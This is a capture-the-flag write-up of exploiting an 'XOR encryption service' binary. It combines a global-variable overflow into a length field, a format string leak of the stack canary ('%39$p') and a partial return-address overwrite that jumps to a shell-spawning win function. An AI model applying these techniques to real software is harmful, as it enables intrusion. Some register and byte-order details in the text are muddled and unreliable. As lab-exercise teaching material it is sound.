## Writeup
To start this challenge, I first ran the `checksec` command on the provided binary file:

![decomp](checksec.png)

All protections were enabled, so I knew I would have to find a way around at least one of them to solve the challenge. Next, I loaded the binary into Ghidra. The `main` function simply prints out "XOR encryption service", then calls the `encryption_service` function. After looking through the code to get a sense of what it was doing, I cleaned up the code by renaming some variables so that it looked like this:

### `encryption_service`
![encryption_service](encryption_service_decomp.png)

### `encrypt`
![encrypt](encrypt_decomp.png)

Beyond this, there were a few other details of interest. The flag was not contained anywhere in the binary, meaning it would require gaining a shell on the remote system to instead find the flag on the filesystem. To further support this idea, there was a `win` function containing code to spawn a shell when called. My goal was to find a way to jump to this `win` function.

Here's what the program does: first, it asks the user to input the `text_length`, which must be between 0 and 256. Next, it asks for the `key` and prints the key back out to the user. Then, it asks for up to `text_length` bytes of `text` to store in a buffer on the stack. Finally, the program then takes the key provided and "encrypts" the buffer via the `encrypt` function. This XORs the text with the key by repeating the key every 8 bytes.

There are two critical places where the vulnerabilities lie. First, `key` and `text_length` are global variables, meaning they are not stored on the stack but rather in the `.bss` section of the binary. When the program accepts input to be used as the `key`, it accepts 10 bytes, which is 2 bytes greater than the allocated space for `key`. Since the item next to `key` is `text_length`, this causes a 2-byte overflow into `text_length`, allowing us to control the two upper-most, or least-significant bytes of `text_length`. Since the program asks for `key` after it asks for `text_length`, we can use this to bypass the check for `text_length` and write values of up to `0xffff` (decimal 65535), meaning we can perform a buffer overflow.

However, by itself, this vulnerability is not enough to gain a shell. While it does allow us to use a buffer overflow to overwrite the value of the saved `%rip`, it doesn't provide us with a way to overcome the stack canary. This is where the second vulnerability comes in. In line 21 of `encryption_service`, `printf` is called with user-controlled input as its only argument. The correct way to write this statement would have been `printf("%s", (char *)&key)`- notice the omission of the `"%s"`. This oversight allows us to perform what is known as a [format string attack](https://owasp.org/www-community/attacks/Format_string_attack). Without the `"%s"`, the C programming language treats the value of `key` as the format string. In normal operation, this will still produce the intended output, but as an attacker, we can pass in format specifiers like `"%p"` as the value of `key` to leak data from the stack. So what exactly would passing `"%p"` print? It does exactly what it normally does, which is print the second argument to `printf` as a pointer, or in other words, `%rdi` (the x86 register for the second argument). By extension, we can add more `%p`s to leak other "arguments", and at the 6th `%p`, start to leak from the top of the stack (since x86 assembly stores arguments beyond the 6th on the stack). The C notation for this would be `"%6$p"`. However, we don't just want the top value of the stack- we want the stack canary. To calculate the offset of the stack canary from the top of the stack as defined at the `printf`, I set a breakpoint in GDB after the `printf` statement and ran `info frame` to find where the canary was stored in the current frame. Then, I calculated the difference between `%rsp` and the location of the canary and divided it by 8 to get the number of "pointers" I needed to offset by. The result was 33, so my format string needed to be `"%39$p"` (33 + 6 to start at the top of the stack). Testing this in GDB confirmed that the program did indeed leak the correct value.

Now that I had the information I needed, all that remained was to craft the actual exploit. Since the goal was to gain a shell using the provided `win` function, I needed to overwrite the value of the stored `%rip` with the address of the `win` function. However, with PIE turned on, that address would be randomized each time the program was ran, which would require another leak to know in its entirety, except for the last 3 hex characters (12 bits). Instead, to avoid having to know the full address, I decided to perform a partial overwrite, which would utilize the existing stored address. The address of the `win` function and the address of `main` which `encryption_service` would normally return to, offset `0x00101433` and `0x001014f8` respectively, were close enough that they only differed by their last byte, even with PIE turned on. This meant I could perform an overwrite of only the least-significant/upper-most byte. Since the "overwrite" was actually an XOR function, this meant making the first byte of the key the value needed to XOR with `0xf8` to result in `0x33`, which is `0xcb`.
